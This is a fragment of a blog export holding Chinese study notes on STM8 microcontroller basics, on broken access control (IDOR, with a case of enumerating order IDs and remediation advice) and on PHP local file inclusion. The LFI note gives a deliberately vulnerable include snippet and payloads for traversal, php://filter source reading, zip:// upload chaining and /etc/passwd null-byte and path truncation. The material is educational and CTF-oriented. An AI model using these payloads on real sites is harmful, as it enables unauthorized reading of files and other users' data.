    <url>/2020/05/05/STM8%E5%8D%95%E7%89%87%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="STM8单片机笔记"><a href="#STM8单片机笔记" class="headerlink" title="STM8单片机笔记"></a>STM8单片机笔记</h1><p>[Toc]</p>
<hr>
<h2 id="单片机的概念"><a href="#单片机的概念" class="headerlink" title="单片机的概念"></a>单片机的概念</h2><ul>
<li>1.单片机是微型计算机的分支，是在一块芯片上集成了CPU、内存（RAM）、程序储存器（ROM）、输入输出接口的微型计算机。</li>
</ul>
<blockquote>
<p>早期的单片机为8位或4位，随着工业控制的要求提高，出现了16位的单片机，目前更是出现了32位的单片机。</p>
</blockquote>
<blockquote>
<p>高端单片机可直接使用专用的window、linux或其他嵌入式操作系统。</p>
</blockquote>
<ul>
<li>2.单片机的<font color="red">优点</font> :高可靠性、高性价比、低电压、低功耗</li>
</ul>
<blockquote>
<p>单片机广泛运用于工业控制系统</p>
</blockquote>
<blockquote>
<p>单片机数量十分庞大，生活中处处都有单片机存在</p>
</blockquote>
<blockquote>
<p>应用例子：医疗电子、安防报警、汽车电子、电机控制、智能仪表、工业控制、智能电子玩具、办公自动化设备</p>
</blockquote>
<ul>
<li>3.STM单片机型号</li>
</ul>
<blockquote>
<p>STM8S20xx主要型号:<br><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538749575402&di=63e52bc718cc5a77f75271e9b538c31e&imgtype=0&src=http%3A%2F%2Fs14.sinaimg.cn%2Fmw690%2F002F0M5izy76RQbY8Tb0d" alt></p>
</blockquote>
<ul>
<li>4.STM8S20xxx系统框图<br><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538749833676&di=1617d25ac9637ef6da727a4cb84ffcf9&imgtype=0&src=http%3A%2F%2Fwww.iot-online.com%2Fuploads%2Fallimg%2F170303%2F1159335D8_0.jpg" alt></li>
</ul>
<hr>
<hr>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
<li>STVD开发环境+CXSTM8编译器</li>
<li>最小系统板，如：STM8S208RBT6</li>
</ul>
<blockquote>
<p><font color="red">注意在6脚VACP和地之间必须接一个去耦电容，不要使用电解电容</font></p>
</blockquote>
<ul>
<li>显示模块</li>
<li>按键输入模块</li>
</ul>
<hr>
<ul>
<li>USB转串口下载线</li>
<li>ST-Link仿真器</li>
</ul>
<hr>
<ul>
<li>古老神灯闪烁实验</li>
</ul>
<hr>
<hr>
<h2 id="I-O口的应用"><a href="#I-O口的应用" class="headerlink" title="I/O口的应用"></a>I/O口的应用</h2><ul>
<li>I/O口的”五器”</li>
</ul>
<blockquote>
<p>1.输出数据寄存器(ODR)、输入引脚寄存器(IDR)、数据方向寄存器(DDR)、控制寄存器1(CR1)、控制寄存器2(CR2)</p>
</blockquote>
<ul>
<li>当Px_DDRn为”1”,对应的Pxn配置为输出；当Px_DDRn为”0”,对应的Pxn配置为输入。</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>越权漏洞学习</title>
    <url>/2019/10/26/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul>
<li>越权，顾名思义就是超出权限范围进行操作。</li>
</ul>
<a id="more"></a>

<ul>
<li>多数WEB应用都具备权限划分和控制，但是如果权限控制功能设计存在缺陷，那么攻击者就可以通过这些缺陷来访问未经授权的功能或数据，这就是我们通常说的越权漏洞。</li>
<li>越权漏洞的==成因==主要是因为开发人员在对数据进++行增、删、改、查询++时对客户端请求的数据过分相信而遗漏了<font color="green">权限的判定</font>。所以测试越权就是和开发人员拼细心的过程。</li>
</ul>
<hr>
<h2 id="主要攻击场景"><a href="#主要攻击场景" class="headerlink" title="主要攻击场景"></a>主要攻击场景</h2><h2 id><a href="#" class="headerlink" title></a><img src="https://image.3001.net/images/20181031/1540965763_5bd945834fb0d.jpg!small" alt="image"></h2><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="1-水平越权"><a href="#1-水平越权" class="headerlink" title="1. 水平越权"></a>1. 水平越权</h3><ul>
<li>水平越权指的是攻击者尝试访问与他拥有==相同权限==的用户的资源</li>
</ul>
<blockquote>
<p>比如某系统中有个人资料这个功能，A账号和B账号都可以访问这个功能，但是A账号的个人信息和B账号的个人信息不同，可以理解为A账号和B账号个人资料这个功能上具备水平权限的划分。此时，A账号通过攻击手段访问了B账号的个人资料，这就是水平越权漏洞。</p>
</blockquote>
<ul>
<li>水平越权主要有三种攻击场景：</li>
</ul>
<ol>
<li>基于用户身份的ID: </li>
</ol>
<p>在使用某个功能时通过用户提交的身份ID（用户ID、账号、手机号、证件号等用户唯一标识）来访问或操作对应的数据。</p>
<ol start="2">
<li>基于对象的ID:</li>
</ol>
<p>在使用某个功能时通过用户提交的对象ID（如订单号、记录号）来访问或操作对应的数据。</p>
<ol start="3">
<li>基于文件名</li>
</ol>
<p>在使用某个功能时通过文件名直接访问文件，最常见于用户==上传文件==的场景。</p>
<hr>
<h3 id="2-垂直越权"><a href="#2-垂直越权" class="headerlink" title="2.垂直越权"></a>2.垂直越权</h3><ul>
<li>垂直越权指的是一个==低==级别攻击者尝试访问==高==级别用户的资源。</li>
</ul>
<blockquote>
<p>比如说某个系统分为普通用户和管理员，管理员有系统管理功能，而普通用户没有，那我们就可以理解管理功能具备垂直权限划分，如果普通用户能利用某种攻击手段访问到管理功能，那我们就称之为垂直越权。</p>
</blockquote>
<ul>
<li>垂直越权主要有两种攻击场景:</li>
</ul>
<ol>
<li>未认账账户访问无需认证后能访问该功能</li>
<li>不具备某个功能权限的账户认证后成功访问该功能</li>
</ol>
<hr>
<h3 id="3-权限框架缺陷"><a href="#3-权限框架缺陷" class="headerlink" title="3. 权限框架缺陷"></a>3. 权限框架缺陷</h3><ul>
<li>权限控制框架是实现权限控制功能的基础，如果权限控制框架本身存在缺陷容易被攻陷会导致权限控制功能完全失效。</li>
</ul>
<blockquote>
<p>在cookie中使用简单的权限标识来标记用户的权限等级或使用用户请求参数中所带的简单用户ID来控制用户权限，是典型的权限框架缺陷。</p>
</blockquote>
<hr>
<h2 id="具体案例："><a href="#具体案例：" class="headerlink" title="具体案例："></a>具体案例：</h2><ol>
<li>在一个提交订单的页面，抓取提交的数据包</li>
</ol>
<p><img src="https://image.3001.net/images/20181031/1540966016_5bd94680f2295.jpg!small" alt="image"><br>发现有一个oid的参数很可疑，尝试进行测试发现，可遍历订单号，查看他人待付款订单信息。<br><img src="https://image.3001.net/images/20181031/1540966045_5bd9469d6ec63.jpg!small" alt="image"></p>
<p>以上为水平越权。</p>
<ol start="2">
<li>站点后使用js跳转来限制未授权用户访问。<pre><code>&lt;script language=&quot;javascript&quot;&gt;
//alert(&quot;非法操作&quot;);
location=&#39;login.php&#39;;
&lt;/script&gt;</code></pre>所以我们只要==去掉js==就能成功访问后台，且可操作<br><img src="https://image.3001.net/images/20181031/1540966271_5bd9477f50f9d.jpg!small" alt="image"></li>
</ol>
<p>以上为垂直越权</p>
<hr>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ul>
<li>采用成熟的权限管理框架：如spring security</li>
<li>用户进行访问操作的凭证（如用户ID、产品号码、订单流水号等）优先采用<font color="red">在服务端关联session或加密后放在session中的方式获取</font>。</li>
<li>必须采用表单或其他参数提交用户进行访问操作的凭证（如用户ID、产品号码、订单流水号等）时，应尽可能采用++难以猜测的构造方式++（增加字母及随机数字等）或++采用复杂的加密算法加密++后提交，应对客户端提交的凭证与会话的权限进行严格的验证，如提交的产品号码是否为隶属于登录用户的产品号码。</li>
<li>对管理功能模块进行严格的权限验证，如非必要建议不对互联网开放或进行网络层的访问控制。</li>
</ul>
<hr>
<p><a href="https://www.freebuf.com/column/188068.html" target="_blank" rel="noopener">转自Freebuf</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
        <category>CTF</category>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含之LFI学习</title>
    <url>/2019/10/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B9%8BLFI%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p><strong>文件包含漏洞主要是由四种函数造成的</strong>：</p>
<ol>
<li>include()</li>
<li>require()</li>
<li>include_once()</li>
<li>require_once()</li>
</ol>
<a id="more"></a>

<ul>
<li>用这四类函数包含文件时，文件会被当做PHP代码来执行</li>
</ul>
<p><strong>include和require的区别：</strong></p>
<ol>
<li>include是<strong>当代码执行到它所在行</strong>才开始包含文件，如果有错，仍继续执行下去</li>
<li>require<strong>是当程序执行</strong>就立即包含文件，有错时会停止并发出警告</li>
</ol>
<p><strong>文件包含漏洞类型</strong></p>
<ol>
<li>本地文件包含（LFI）</li>
<li>远程文件包含（RFI）<blockquote>
<p>当php.ini中，设置allow_url_include=On,allow_url_fopen=on.即可执行远程代码</p>
</blockquote>
</li>
</ol>
<hr>
<h3 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h3><ul>
<li><strong>从URL判断</strong><br>URL中path、dir、file、page、p、eng等等都可能存在文件包含漏洞<pre><code>http://www.example.com/?file=xxx.php</code></pre></li>
</ul>
<hr>
<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p><strong>1. 直接修改参数</strong></p>
<pre><code>&lt;?php
    if(isset($_GET[&#39;file&#39;])
    {
        include &#39;$_GET[&#39;file&#39;]&#39;;
    }else{
        include &#39;index.php&#39;；
    }
?&gt;</code></pre><p>比如网站的url为：</p>
<pre><code>http://www.example.com/?file=index.php</code></pre><p>将<strong>index.php</strong>改为<strong>flag.php</strong></p>
<pre><code>http://www.example.com/?file=flag.php</code></pre><p>即可输出<strong>flag.php</strong>的内容</p>
<p>也可将<strong>?file=index.php</strong>改为<strong>../xxx.php</strong></p>
<pre><code>http://www.example.com/?file=../xxx.php</code></pre><p>即可返回<strong>上一级目录下</strong>的xxx.php文件的内容</p>
<ul>
<li><strong>既然这样,我们就可以使用./(当前目录)、../(上级目录)对整个目录进行遍历,也就可以获取敏感的文件</strong></li>
</ul>
<hr>
<p><strong>2. 利用PHP伪协议</strong></p>
<ul>
<li><strong>php://input</strong></li>
</ul>
<p>php://input可以读取没有处理过的==POST==数据。<strong>但当enctype=’multipart/form-data’的时候php://input是无效的。</strong></p>
<p><img src="https://images2017.cnblogs.com/blog/1274619/201711/1274619-20171109171422763-1355830569.png" alt="image"></p>
<ul>
<li><strong>php://filter</strong></li>
</ul>
<p>用它在没有特殊情况下可以进行任意文件的读取。一般与<strong>base64编码</strong>合用，以base64编码的格式来把源代码显示出来。</p>
<p><strong>poc: php://filter/read=convert.base64-encode/resource=xxx.php</strong></p>
<p>南邮的ctf题目(文件包含)为例<br><a href="http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">nctf文件包含</a></p>
<ul>
<li><strong>zip协议</strong></li>
</ul>
<p>关于zip协议：可配合<strong>文件上传漏洞</strong>打组合拳</p>
<p><strong>利用方法：zip://test.jpg#dir/test.php</strong></p>
<p><font color="green">先新建一个test.php,里面写个phpinfo,然后压缩成.zip,然后把zip的名字改成test.jpg后把这个jpg文件上传上去 然后使用zip协议包含.</font></p>
<hr>
<p><strong>3. 包含系统的各种日志。</strong></p>
<p>如apache日志，文件系统日志等。其中apache当记录格式为combined。再比如ngnix日志，默认路径为/var/log/ngnix/access.log</p>
<p><a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">buuoj的一道ctf题</a></p>
<p>……</p>
<hr>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><pre><code>&lt;?php
    include $_GET[&#39;page&#39;].&quot;.php&quot;;

?&gt;</code></pre><p>以上代码是防御LFI漏洞的其中一种方式<br>绕过方式也很简单</p>
<p><strong>1. 00截断</strong></p>
<p>(1) /etc/passwd%00,访问文件</p>
<p>(2) %00目录遍历</p>
<p><strong>2. 使用长目录截断</strong><br>/etc/passwd/././././././.[……]/./././././.<br>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p>
<blockquote>
<p>截断要考虑两个问题magic_quotes_gpc（）和PHP版本（5.3.4以下）。</p>
</blockquote>
]]></content>
      <categories>
        <category>WEB安全</category>
        <category>CTF</category>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
